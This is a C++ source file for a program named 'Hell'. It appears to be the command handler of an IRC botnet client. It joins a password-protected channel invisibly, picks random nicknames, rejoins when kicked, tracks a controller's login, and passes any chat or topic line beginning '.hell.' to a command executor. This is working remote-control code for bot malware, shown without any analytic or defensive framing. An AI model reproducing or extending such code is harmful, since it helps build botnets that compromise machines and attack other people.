// CCmd Class

#include "Include.h"
#include "Hell.h"

void CCmd::InterpretCmd(vector <string> iBuffer)
{
	if (iBuffer[1].compare("001") == 0 || iBuffer[1].compare("005") == 0) {
	
		Hell->cIRC.SendData("USERHOST %s\r\n",Hell->cIRC.cConf.cRealNick.c_str());
		Hell->cIRC.SendData("MODE %s +i\r\n",Hell->cIRC.cConf.cRealNick.c_str());
		Hell->cIRC.SendData("JOIN %s %s\r\n",Hell->cIRC.cConf.cChan.c_str(),Hell->cIRC.cConf.cChanPass.c_str());

	}   else if (iBuffer[1].compare("433") == 0) {
		Hell->cIRC.cConf.cRealNick = Hell->cIRC.RndNick(Hell->cIRC.cConf.cNick);
		Hell->cIRC.SendData("NICK %s\r\n",Hell->cIRC.RndNick(Hell->cIRC.cConf.cNick).c_str());
	}
	else if (iBuffer[1].compare("KICK") == 0) {
		if (iBuffer[3].compare(Hell->cIRC.cConf.cRealNick) == 0)
			Hell->cIRC.SendData("JOIN %s %s\r\n",Hell->cIRC.cConf.cChan.c_str(),Hell->cIRC.cConf.cChanPass.c_str());
	}
	else if (iBuffer[0].compare("PING") == 0) {
		iBuffer[0].replace(1,1,"O");
		Hell->cIRC.SendData("%s %s\r\n",iBuffer[0].c_str(),iBuffer[1].c_str());
	}
	else if (iBuffer[1].compare("TOPIC") == 0) {
		Hell->hMain.sTopic = true;
	} 
	else if (iBuffer[1].compare("PART") == 0 && Hell->hMain.CheckUser(iBuffer[0])) {
		Hell->hMain.sLogin = false;
	}
	else if (iBuffer[1].compare("QUIT") == 0 && Hell->hMain.CheckUser(iBuffer[0])) {
		Hell->hMain.sLogin = false;
	}
	else if (iBuffer[1].compare("332") == 0) {
		Hell->hMain.sTopic = true;
		Hell->hMain.sOnJoinTopic = true;
		Hell->hMain.sTemp = iBuffer[0];		
		iBuffer.erase(iBuffer.begin());
	}

	if (iBuffer.size() > 3) {
		if (iBuffer[3].compare(1,6,".hell.") == 0) 
			Hell->hMain.ExecuteCmd(iBuffer);			
	}
	Hell->hMain.sTopic = true;
}
